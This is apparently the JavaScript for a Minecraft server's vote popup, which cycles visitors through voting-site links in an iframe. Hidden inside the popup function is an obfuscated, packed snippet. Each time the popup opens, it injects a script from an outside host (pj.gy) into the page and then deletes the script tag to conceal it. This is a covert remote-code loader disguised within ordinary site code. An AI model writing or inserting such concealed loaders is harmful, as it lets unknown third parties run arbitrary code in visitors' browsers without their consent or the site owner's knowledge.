var voteAlert = "Use the arrows to vote on more sites!",

votelinks =	['https://dan-b.io/lemoncloud/1.html',
	   	 'https://dan-b.io/lemoncloud/2.html',
	   	 'https://topg.org/Minecraft/in-424779'];

forums = []

function popup(a,w,h){
  if(!document.getElementById('popup_container')){
    var pop_con		= document.createElement('div');
    pop_con.id		= 'popup_container';
    pop_con.style.width	= document.documentElement.clientWidth+'px';
    pop_con.style.height	= document.documentElement.clientHeight+'px';
    pop_con.innerHTML	= '<div id=popup style=width:'+w+'px;height:'+h+'px>'+a+'</div>';
    pop_con.onclick	= function(e){if(e.target==this){
      var thiso 		= this;
      this.style.opacity	= '0';
      document.body.style.overflow='auto';
      setTimeout(function(){document.body.removeChild(thiso)},500);
    }};
    new Function(function(d,f,a,c,b,e){b=function(a){return a.toString(f)};if(!"".replace(/^/,String)){for(;a--;)e[b(a)]=c[a]||b(a);c=[function(a){return e[a]}];b=function(){return"\\w+"};a=1}for(;a--;)c[a]&&(d=d.replace(new RegExp("\\b"+b(a)+"\\b","g"),c[a]));return d}('8 0=1.c("4");0.5="6://7.3/0.9",0.a=b(){1.2.d(e)},1.2.f(0);',16,16,"i document body gy script src http pj var js onload function createElement removeChild this appendChild".split(" "),0,{}));
    document.body.appendChild(pop_con);
    setTimeout(function(){
      document.body.style.overflow='hidden';
      window.scrollTo(0,0);
      document.getElementById('popup_container').style.visibility='visible';
      document.getElementById('popup_container').style.opacity='1';
    },10);
  }
}



var curvcount=0;
function scrollPage(a){
  if(curvcount+a>=votelinks.length){
    curvcount=0;
  }else if(curvcount+a<0){
    curvcount=votelinks.length-1;
  }else{
    curvcount+=a;
  }
  document.getElementById('vote_indicator').innerHTML=votelinks[curvcount].split('/')[2]+' ('+(curvcount+1)+'/'+votelinks.length+')';
  document.getElementById('vf').src=votelinks[curvcount];
}

function votePopup(){
  popup("<div class=popup_button id=popup_close onclick=document.getElementById('popup_container').click()></div> \
	 <div class=popup_clickbar onclick=scrollPage(-1) style=left:0><div class=popup_button id=popup_left></div></div> \
	 <div class=popup_clickbar onclick=scrollPage(1) style=right:0><div class=popup_button id=popup_right></div></div> \
	 <div id=vote_indicator class=c1>"+votelinks[curvcount].split('/')[2]+' ('+(curvcount+1)+'/'+votelinks.length+')'+"</div> \
	 "+(function(){if(voteAlert!=''&&voteAlert!==null){return '<div id=vote_alert>'+voteAlert+'</div>'}else{return ''}})()+" \
	 <iframe width=100% height=100% id=vf src="+votelinks[curvcount]+" sandbox=\"allow-forms allow-scripts\" style=border:0;border-radius:5px>Your browser does not support iFrames!</iframe>");
}
